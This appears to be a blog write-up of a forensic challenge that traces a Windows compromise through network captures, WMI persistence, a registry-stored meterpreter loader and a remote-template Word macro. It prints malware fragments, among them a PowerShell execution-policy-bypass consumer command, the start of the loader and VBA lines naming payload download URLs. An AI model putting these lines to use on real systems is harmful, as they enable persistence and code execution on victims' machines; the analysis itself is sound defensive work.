<p>üõ† Regitsry Browser (EZ), <a href="https://github.com/EricZimmerman/AmcacheParser">AmCache Parser</a> + Timeline Explorer</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">AmcacheParser</span><span class="p">.</span><span class="n">exe</span> <span class="o">-f</span> <span class="p">&lt;</span><span class="n">path_to_AmCache</span><span class="p">.</span><span class="n">hve</span><span class="p">&gt;</span> <span class="n">-i</span> <span class="n">on</span> <span class="p">-</span><span class="n">-csv</span> <span class="p">&lt;</span><span class="n">export_to_folder_no_quotes</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-csvf</span> <span class="p">&lt;</span><span class="n">desired_filename</span><span class="p">&gt;</span> 
</span></span></code></pre></div><h3 id="artefact-network-traffic-dump"><strong>Artefact</strong>: network traffic dump</h3>
<p><strong>Information</strong>:</p>
<ol>
<li>Suspicious DNS resolved</li>
<li>Suspicious traffic</li>
<li>Beacons like every constant period of time.</li>
</ol>
<p>üõ† Wireshark</p>
<p>I will load the first pcap file and then merge it with the second one using GUI of Wireshark. The first thing I am going to check is that South African IP - 196.6.112.70. I will use Wireshark filter bar:  <code>ip.src==196.6.112.70 or ip.dst==196.6.112.70 </code>. Aha! I see some plain text HTTP traffic, that&rsquo;s see what&rsquo;s in it: <code>ip.src==196.6.112.70 or ip.dst==196.6.112.70  and http</code>. Aha. Two GET requests for <code>disco.jpg</code>. Let&rsquo;s <code>Follow HTTP Stream</code>.</p>
<p>Even thout it claims to be a <code>.png</code>, it looks like a certificate:</p>
<p><img src="fakecert.png" alt="fakecert"></p>
<p>But it&rsquo;s way too large for a certificate. Let&rsquo;s Base64 decode it to see what&rsquo;s inside. I&rsquo;ll use <a href="https://www.base64decode.org/">this</a> online tool. Well, it claimed to be a <code>png</code>, looked like a cert, but it&rsquo;s a windows executable, look at the header (<code>MZ</code>, <code>PE</code> and sections <code>text</code>, <code>rsrc</code>, <code>reloc</code> and the notable string <code>This program cannot be run in DOS mode</code>):</p>
<p><img src="mzheader.png" alt="mzheader"></p>
<p>I need a python script to get the bytes for analysis:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="n">string</span><span class="o">=</span><span class="s2">&#34;this is where this fake cert will go&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/path/to/malicious.exe&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">exe</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">exe</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">string</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Finished!&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>I wound if the two request have the same executable sent.</p>
<p>They are the same:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">‚ûú  results md5 result.exe 
</span></span><span class="line"><span class="cl">MD5 <span class="o">(</span>result.exe<span class="o">)</span> <span class="o">=</span> 0e78eb7fc6702f12af6c4ef8aaa485ac
</span></span><span class="line"><span class="cl">‚ûú  results md5 result2.exe
</span></span><span class="line"><span class="cl">MD5 <span class="o">(</span>result2.exe<span class="o">)</span> <span class="o">=</span> 0e78eb7fc6702f12af6c4ef8aaa485ac
</span></span><span class="line"><span class="cl">‚ûú  results 
</span></span></code></pre></div><h3 id="artefact-wmi-db">Artefact: WMI DB</h3>
<p>üõ†: <a href="https://github.com/davidpany/WMI_Forensics/blob/master/PyWMIPersistenceFinder.py">PyWMIPersistenceFinder.py</a>, <code>wmic</code>, <code>powershell</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">pywmi</span> <span class="n">OBJECTS</span><span class="p">.</span><span class="n">DATA</span> <span class="c"># alias for PyWMIPersistenceFinder.py=pywmi</span>
</span></span><span class="line"><span class="cl"><span class="p">[....]</span>
</span></span><span class="line"><span class="cl"><span class="n">LogRotate</span> <span class="nb">Consumer-LogRotate</span> <span class="n">Event</span>
</span></span><span class="line"><span class="cl">            <span class="n">Consumer</span><span class="err">:</span> 
</span></span><span class="line"><span class="cl">		<span class="n">Consumer</span> <span class="n">Type</span><span class="err">:</span> <span class="n">CommandLineEventConsumer</span>
</span></span><span class="line"><span class="cl">		<span class="n">Arguments</span><span class="err">:</span>     <span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-noP</span> <span class="n">-ep</span> <span class="n">bypass</span> <span class="nb">iex </span><span class="n">-c</span> <span class="s2">&#34;(&#39;C:\Users\john.goldberg\AppData\Roaming\Microsoft\Office\Recent\tmpA7Z2.ps1&#39;)&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="n">Consumer</span> <span class="n">Name</span><span class="err">:</span> <span class="n">LogRotate</span> <span class="n">Consumer</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">Filter</span><span class="err">:</span> 
</span></span><span class="line"><span class="cl">		<span class="k">Filter</span> <span class="n">name</span><span class="err">:</span>  <span class="n">LogRotate</span> <span class="n">Event</span>
</span></span><span class="line"><span class="cl">		<span class="k">Filter</span> <span class="n">Query</span><span class="err">:</span> <span class="nb">SELECT </span><span class="p">*</span> <span class="n">FROM</span> <span class="n">__InstanceCreationEvent</span> <span class="n">WITHIN</span> <span class="n">10</span> <span class="nb">WHERE </span><span class="n">TargetInstance</span> <span class="n">ISA</span> <span class="s1">&#39;Win32_LoggedOnUser&#39;</span>
</span></span></code></pre></div><p>This query:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">__InstanceCreationEvent</span><span class="w"> </span><span class="n">WITHIN</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">TargetInstance</span><span class="w"> </span><span class="n">ISA</span><span class="w"> </span><span class="s1">&#39;Win32_LoggedOnUser&#39;</span><span class="w">
</span></span></span></code></pre></div><p>says to launch the command <code>powershell.exe -noP -ep bypass iex -c &quot;('C:\Users\john.goldberg\AppData\Roaming\Microsoft\Office\Recent\tmpA7Z2.ps1')&quot;</code> when a user is logged on. These options <code>-noP -ep bypass iex -c</code> for <code>powershell</code> means:</p>
<ul>
<li><code>-noP</code> - no profile. I don&rsquo;t yet understand any practical use of this option for the attacker.</li>
<li><code>-ep</code> - execution policy. Same as <code>Set-ExecutionPolicy Bypass</code>. Means that unsigned scripts from anywhere can be run on the machine.</li>
<li><code>iex</code> - alias for <code>Invoke-Expression</code>.</li>
<li><code>-c</code> -alias for the <code>Invoke-Expression</code> argument <code>-command</code>.</li>
</ul>
<p>What&rsquo;s in this <code>ps1</code> script?</p>
<h2 id="malware-analysis">Malware Analysis</h2>
<h3 id="malware-file-1">Malware File 1</h3>
<p>The file that was downloaded is likely to be a .NET application (IDA Pro suggested so). So, I&rsquo;ve opened it in dnspy.</p>
<p><img src="dnspymalware.png" alt="dnspymalware"></p>
<p>Yeah! It&rsquo;s a .NET application, called <code>SharpHound</code>. By the way, Windows Defender on my Windows 11 VM machine has already deleted it twice, so I had to turn it off for analysis. It&rsquo;s already a bad/good sign (depending on the angle).</p>
<p>PE Explorer says that it&rsquo;s a 32-bit Windows Console Application. Given the size of the code, it&rsquo;s not packed.</p>
<p>Thankfully, the author of the malware didn&rsquo;t bother protecting the file and its intents: all function names are pretty self-explanatory: GetDomainControllers(), GetLoggedOnUsersAPI, ProcessLoggedOn, IsSidDomainController, NetWkstaUserEnum etc. Looks like some variation of a BloodHound malware which is hunting down DC and using LDAP.</p>
<h3 id="malware-file-2">Malware File 2</h3>
<p>So, from the OBJECTDATA WMI database I&rsquo;ve detected a malicious Event Consumer (LogRotate Consumer - cunning üòâ). This revealed that there was a <code>ps1</code> script somewhere on the system, named <code>tmpA7Z2.ps1</code>. I&rsquo;ve used a keyword search option of <code>chainsaw</code> utility and discovered the script itself that got fully logged in several messages, part by part. I&rsquo;ve assembled that script, but the most important data was at the very start: get some encoded and compressed value from the registry key <code>HKU:\\S-1-5-21-3899523589-2416674273-2941457644-1104\\Software\\RegisteredApplications\</code>.</p>
<p>Here is the code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">New-PSDrive</span> <span class="n">HKU</span> <span class="n">Registry</span> <span class="n">HKEY_USERS</span>
</span></span><span class="line"><span class="cl"><span class="nv">$rk</span> <span class="p">=</span> <span class="p">\</span><span class="s2">&#34;HKU:\\S-1-5-21-3899523589-2416674273-2941457644-1104\\Software\\RegisteredApplications\&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$rv</span> <span class="p">=</span> <span class="p">\</span><span class="s2">&#34;AppXs42fd12c3po92dynnq2r142fs12qhvsmyy\&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$p</span> <span class="p">=</span> <span class="p">(</span><span class="nb">gp </span><span class="n">-Path</span> <span class="nv">$rk</span> <span class="n">-Name</span> <span class="nv">$rv</span><span class="p">).</span><span class="nv">$rv</span>
</span></span><span class="line"><span class="cl"><span class="nv">$CompBytes</span> <span class="p">=</span> <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$input</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">(,</span><span class="nv">$CompBytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$output</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span>
</span></span><span class="line"><span class="cl"><span class="nv">$gzipStream</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">GzipStream</span> <span class="nv">$input</span><span class="p">,(</span><span class="no">[IO.Compression.CompressionMode]</span><span class="p">::</span><span class="n">Decompress</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$gzipStream</span><span class="p">.</span><span class="n">CopyTo</span><span class="p">(</span><span class="nv">$output</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$gzipStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nv">$input</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="no">[byte[]]</span> <span class="nv">$PEBytes</span> <span class="p">=</span> <span class="nv">$output</span><span class="p">.</span><span class="n">ToArray</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">[...]</span>
</span></span></code></pre></div><p>I&rsquo;ve used üõ† Registry Explorer (E.Zimmermans tool) to load this hive (<code>NTUSER.DAT</code>) for user <code>john.goldberg</code>, navigated to the above mentioned key, searched for <code>AppXs42fd12c3po92dynnq2r142fs12qhvsmyy </code> subkey and exported its value. So, the code above gets the value from the registry, base64 decodes it and finally decompresses it. I&rsquo;ve then prepared a script to get the final data.</p>
<blockquote>
<p>üìù By the way, I wasn&rsquo;t able to run this script in PowerShell on my Win11 VM. Kept getting the error below even when running with elevated privileges. Turning off Windows Defender and Tamper Protection let the script run in the end.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">This</span> <span class="n">script</span> <span class="n">contains</span> <span class="n">malicious</span> <span class="n">content</span> <span class="n">and</span> <span class="n">has</span> <span class="n">been</span> <span class="n">blocked</span> <span class="n">by</span> <span class="n">your</span> <span class="n">antivirus</span> <span class="n">software</span><span class="p">.</span>
</span></span><span class="line"><span class="cl">    <span class="p">+</span> <span class="n">CategoryInfo</span>          <span class="err">:</span> <span class="n">ParserError</span><span class="err">:</span> <span class="p">(</span><span class="err">:</span><span class="p">)</span> <span class="p">[],</span> <span class="n">ParentContainsErrorRecordException</span>
</span></span><span class="line"><span class="cl">    <span class="p">+</span> <span class="n">FullyQualifiedErrorId</span> <span class="err">:</span> <span class="n">ScriptContainedMaliciousContent</span>
</span></span></code></pre></div><p>However, the <code>ps1</code> script returned the array of decimal integers and <code>Out-File</code> just wrote these, so I didn&rsquo;t get my exe.</p>
</blockquote>
<p>So, this is my üêç script for decoding this value and writing it into a <code>.exe</code> binary file:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/Users/veronicazvereva/Documents/dfir/cases/CyberPolygon_Forensic_Artifacts/results/malicious2.exe&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">exe</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">exe</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">zlib</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">string</span><span class="p">),</span> <span class="mi">15</span> <span class="o">+</span> <span class="mi">32</span><span class="p">))</span> <span class="c1"># thank you John Machin https://stackoverflow.com/questions/6123223/howto-uncompress-gzipped-data-in-a-byte-array</span>
</span></span></code></pre></div><p>And I&rsquo;ve got my data! A very small PE-exeuctable which was detected as meterpreter by some antivuruses, Microsoft Defender was one of them. This code is then injected into <code>winlogon</code> process. That&rsquo;s what the rest of the script is about.</p>
<p>How did this script get to the system? Wireshark search for <code>tmpA7Z2</code> returned no results. What&rsquo;s peculiar, <code>chainsaw</code> didn&rsquo;t return any results as well. The challenge questions do give a hint: <em>The system was compromised as the result of a Microsoft Office document opening, received by email</em>. So, this document with a malicious macro should have been spotted by the network tap and thus found in network traffic dump and may be in memory as well.</p>
<p><code>vol3 -f memdump.mem windows.filescan.FileScan | grep doc</code> revealed quite a few docs in memory:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">0xcd83fec6b3f0.0<span class="se">\U</span>sers<span class="se">\j</span>ohn.goldberg<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\P</span>ackages<span class="se">\o</span>ice_16_974fa576_32c1d314_18f6<span class="se">\A</span>C<span class="se">\T</span>emp<span class="se">\B</span>D30DCE4.docx	<span class="m">216</span>
</span></span><span class="line"><span class="cl">0xcd83fecf2ef0	<span class="se">\!</span>Work<span class="se">\M</span>arketing<span class="se">\D</span>ocs<span class="se">\T</span>he OPEC Monthly Oil Market Report_Miller.docx	<span class="m">216</span>
</span></span><span class="line"><span class="cl">0xcd83ff9da700	<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\s</span>hdocvw.dll	<span class="m">216</span>
</span></span><span class="line"><span class="cl">0xcd83ffce5ef0	<span class="se">\!</span>Work<span class="se">\R</span><span class="p">&amp;</span>D<span class="se">\W</span>hy Saudi Arabia Will Lose The Next Oil Price War.docx	<span class="m">216</span>
</span></span><span class="line"><span class="cl">0xcd83ffeb7380	<span class="se">\!</span>Work<span class="se">\M</span>arketing<span class="se">\D</span>ocs<span class="se">\T</span>he OPEC Monthly Oil Market Report_Miller.docx	<span class="m">216</span>
</span></span><span class="line"><span class="cl">0xcd84011c9190	<span class="se">\!</span>Work<span class="se">\R</span><span class="p">&amp;</span>D<span class="se">\W</span>hy Saudi Arabia Will Lose The Next Oil Price War.docx	<span class="m">216</span>
</span></span><span class="line"><span class="cl">0xcd840134c090	<span class="se">\U</span>sers<span class="se">\j</span>ohn.goldberg<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\P</span>ackages<span class="se">\o</span>ice_16_974fa576_32c1d314_18f6<span class="se">\A</span>C<span class="se">\T</span>emp<span class="se">\B</span>D30DCE4.docx	<span class="m">216</span>
</span></span><span class="line"><span class="cl">0xcd84013d9c40	<span class="se">\!</span>Work<span class="se">\R</span><span class="p">&amp;</span>D<span class="se">\W</span>hy Saudi Arabia Will Lose The Next Oil Price War.docx	<span class="m">216</span>
</span></span><span class="line"><span class="cl">0xcd84014b7db0	<span class="se">\!</span>Work<span class="se">\R</span><span class="p">&amp;</span>D<span class="se">\~</span><span class="nv">$y</span> Saudi Arabia Will Lose The Next Oil Price War.docx	<span class="m">216</span>
</span></span><span class="line"><span class="cl">0xcd84016f9ab0	<span class="se">\!</span>Work<span class="se">\M</span>arketing<span class="se">\D</span>ocs<span class="se">\T</span>he OPEC Monthly Oil Market Report_Miller.docx	<span class="m">216</span>
</span></span></code></pre></div><p>This one <code>0xcd83fec6b3f0.0\Users\john.goldberg\AppData\Local\Packages\oice_16_974fa576_32c1d314_18f6\AC\Temp\BD30DCE4.docx</code> is very suspicious. Let&rsquo;s find it in Wireshark (File -&gt; Export -&gt; IMF). This gave me a list of <code>eml</code> files (email messages format).</p>
<p>Running <code>oleid Why\ Saudi\ Arabia\ Will\ Lose\ The\ Next\ Oil\ Price\ War.docx</code> revealed that the file did not contain any macro code. However, that&rsquo;s not the only way to exploit a doc file. Another way is to use external relationships. Uppon openning the file Word will resolve these relationships. In this case this relationship was in a template and this relationship was a link to <code>http://75.19.45.11/Supplement.dotm</code> (using <code>oleobj Why\ Saudi\ Arabia\ Will\ Lose\ The\ Next\ Oil\ Price\ War.docx</code>). What was in it? <code>wget</code> is of no use now, the host does not respond. What other options do I have? How about <code>vol.py</code>?</p>
<p><code>vol3 -f memdump.mem windows.filescan.FileScan | grep dotm</code> shows several files of that extension:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">0xcd83ffa9b650.0<span class="se">\U</span>sers<span class="se">\j</span>ohn.goldberg<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\T</span>emplates<span class="se">\N</span>ormalEmail.dotm	<span class="m">216</span>
</span></span><span class="line"><span class="cl">0xcd8400f25650	<span class="se">\U</span>sers<span class="se">\j</span>ohn.goldberg<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>NetCache<span class="se">\C</span>ontent.MSO<span class="se">\4</span>29D2892.dotm	<span class="m">216</span>
</span></span><span class="line"><span class="cl">0xcd8401425800	<span class="se">\U</span>sers<span class="se">\j</span>ohn.goldberg<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\O</span>ffice<span class="se">\R</span>ecent<span class="se">\S</span>upplement.dotm.url	<span class="m">216</span>
</span></span><span class="line"><span class="cl">0xcd8401750520	<span class="se">\U</span>sers<span class="se">\j</span>ohn.goldberg<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\T</span>emplates<span class="se">\N</span>ormalEmail.dotm	<span class="m">216</span>
</span></span><span class="line"><span class="cl">0xcd84017ebef0	<span class="se">\U</span>sers<span class="se">\j</span>ohn.goldberg<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\T</span>emplates<span class="se">\N</span>ormal.dotmp	<span class="m">216</span>
</span></span><span class="line"><span class="cl">0xcd8401aea3f0	<span class="se">\U</span>sers<span class="se">\j</span>ohn.goldberg<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>NetCache<span class="se">\C</span>ontent.MSO<span class="se">\4</span>29D2892.dotm	<span class="m">216</span>
</span></span><span class="line"><span class="cl">0xcd8401ca8090	<span class="se">\U</span>sers<span class="se">\j</span>ohn.goldberg<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\T</span>emplates<span class="se">\N</span>ormal.dotm	<span class="m">216</span>
</span></span></code></pre></div><p>However, I couldn&rsquo;t dump it with vol3&rsquo;s dumpfile plugin. I&rsquo;ve decided to utilize vol2 for that (afterall, the developers warned us on the last year OSDFCon that this new version can be buggy for some time). May be it&rsquo;s a bug?</p>
<p>The difficulty with the vol2 is that I have to manually determine the OS version in order for it to work properly. Since this challenge is quite new, I think it&rsquo;s not Windows XP.</p>
<p>Recovering the files that were deleted is a tough task for NTFS. The only option is to carve. In case we need a name only or of the contents of the file is small, MFT table can be used. <code>.\MFTECmd.exe -f 'C:\Users\veronicazvereva\Documents\samples\$MFT.copy0' --csv &quot;C:\Users\veronicazvereva\Documents\samples&quot; --csvf &quot;resultsmft.csv&quot;</code>.</p>
<p>I&rsquo;ve dumped all the <code>dotm</code> files and ran <code>oleid</code> for each. Luckily, there were not too much of these and the first one was my guy:</p>
<p><img src="oleid_supplement.png" alt="oleid_supplement"></p>
<p>This utility indicated that this file might be malicious since it contains a macro. Let&rsquo;s extract it with <code>olevba file.0xcd8400f25650.0xcd840131b780.DataSectionObject.429D2892.dotm.dat </code> then. This is the summary:</p>
<p><img src="olevba_supplement.png" alt="olevba_supplement"></p>
<p>And below is the script itself (cropped). In general, it created Event Consumers and stuff and downloaded the <code>tmpA7Z2.ps1</code> script which is responsible for the meterpreter injection into winlogon process. A good question, how could this injection actually happen? I though Windows systems are now very secured from this type of attack.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-vb" data-lang="vb"><span class="line"><span class="cl"><span class="o">[</span><span class="p">...</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">xrUrl</span> <span class="o">=</span> <span class="s">&#34;https://raw.githubusercontent.com/xia33F/APT/master/payloads/master_page&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">xfUrl</span> <span class="o">=</span> <span class="s">&#34;https://raw.githubusercontent.com/xia33F/APT/master/payloads/wrapper_page&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">xFilePath</span> <span class="o">=</span> <span class="n">Environ</span><span class="p">(</span><span class="s">&#34;APPDATA&#34;</span><span class="p">)</span> <span class="o">&amp;</span> <span class="s">&#34;\Microsoft\Office\Recent\&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">xFileName</span> <span class="o">=</span> <span class="s">&#34;tmpA7Z2.ps1&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">xFileFullPath</span> <span class="o">=</span> <span class="n">xFilePath</span> <span class="o">&amp;</span> <span class="n">xFileName</span>
</span></span><span class="line"><span class="cl">    <span class="n">xADSName</span> <span class="o">=</span> <span class="s">&#34;secret.txt&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">xRegKey</span> <span class="o">=</span> <span class="s">&#34;HKEY_USERS\S-1-5-21-3899523589-2416674273-2941457644-1104\Software\RegisteredApplications\AppXs42fd12c3po92dynnq2r142fs12qhvsmyy&#34;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">PayloadConsumer</span> <span class="o">=</span> <span class="s">&#34;powershell.exe -noP -ep bypass iex -c &#34;&#34;(&#39;&#34;</span> <span class="o">&amp;</span> <span class="n">xFileFullPath</span> <span class="o">&amp;</span> <span class="s">&#34;&#39;)&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="p">...</span><span class="o">]</span>
</span></span></code></pre></div><h2 id="malware-3">Malware 3</h2>
<p>RegisteredApplication key. Doing so avoids the need for applications to modify the system PATH environment variable.</p>

  </div>
</article>
</div>
</div>

        </div>
      </div>
    </div>
    
  </div>

  <div class="sub-footer">
  <div class="container">
    <div class="row">
      <div class="col-12">
        <div class="sub-footer-inner">
          <ul>
            <li class="zerostatic"><a href="https://www.zerostatic.io">www.zerostatic.io</a></li>
          </ul>
        </div>
      </div>
    </div>
  </div>
</div>

  

  
  

  
  <script type="text/javascript" src="/js/scripts.min.302a6fc365d5139fb98cf60bdb8f715d96257ea189161d36c190ccfa8182e569.js"></script>
  

  
  
  
    
  


</body>

</html>
